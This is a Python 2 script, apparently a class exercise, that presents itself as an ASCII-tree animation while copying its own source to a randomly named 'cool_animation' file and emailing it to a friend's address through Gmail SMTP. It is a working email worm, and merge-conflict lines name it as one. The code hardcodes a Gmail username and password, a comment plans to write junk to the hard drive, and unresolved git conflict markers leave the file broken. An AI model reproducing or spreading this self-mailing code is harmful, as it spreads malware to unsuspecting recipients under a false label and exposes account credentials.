import os
import smtplib
import shutil
import random
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import Encoders
from email.MIMEBase import MIMEBase

def send_email(sender , name , friend , email):
    fromaddr = sender
    toaddr = email
    fromname = name
    toname = friend
    
    message = """From: {} <{}>
    To: {} <{}>
    Subject: Super Cool Animation!

    This is only a wildabeast!
    """


    messagetosend = message.format(
            name,
            email,
            toname,
            toaddr)

    message = MIMEText(messagetosend)

    msg = MIMEMultipart()
    msg['From'] = sender
    msg['Subject'] = 'Super Cool Animation'
    msg['Date'] = formatdate(localtime=True)
    msg.attach(message)


    username = 'travisinfo3180@gmail.com'
    password = 'INFO3180'


    file_name = 'cool_animation_%r.py' % (random.randint(1 , 101))


    shutil.copy(__file__ , file_name)

    header = 'Content-Disposition', 'attachment; filename="%s"' % file_name 

    msg['To'] = email
    attachment = MIMEBase('application', "octet-stream")

    try:
        with open(file_name, 'rb') as fh:
            data = fh.read()
            attachment.set_payload(data)
            Encoders.encode_base64(attachment)
            attachment.add_header(*header)
            msg.attach(attachment)
    except IOError:
        print "Error sharing :("

    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(username,password)
    server.sendmail(fromaddr , toaddr , msg.as_string())
    server.quit()
>>>>>>> Attatches worm in email

def draw_tree():
	print""""
        __  __
      _/_ \/ _\_
     O/_ \||/ _\O
     O/ \ \/ / \O                _  _
      O   ||   O                  \/ 
          ||                      ||
          ||                      ||
.)(.....||||||........))(O.......||||...
"""
   

if __name__ == '__main__':
<<<<<<< 63a29116d6ecdaa825282697fb547454a3c532e1
    #Do Stuff To make Tree or whatever
    draw_tree()
=======

>>>>>>> Attatches worm in email
    print """
    Like what you see?
    Share with your friends"""

    name = raw_input('Enter Friends Your Name here: ')
    sender  = raw_input('And your email Address: ')
    friend = raw_input("Enter your friend's name: ")
    email  = raw_input("And your friend's email address: ")
    send_email(sender, name , friend , email)


    #Send Email Here

    #Write Junk to Hard Drive here



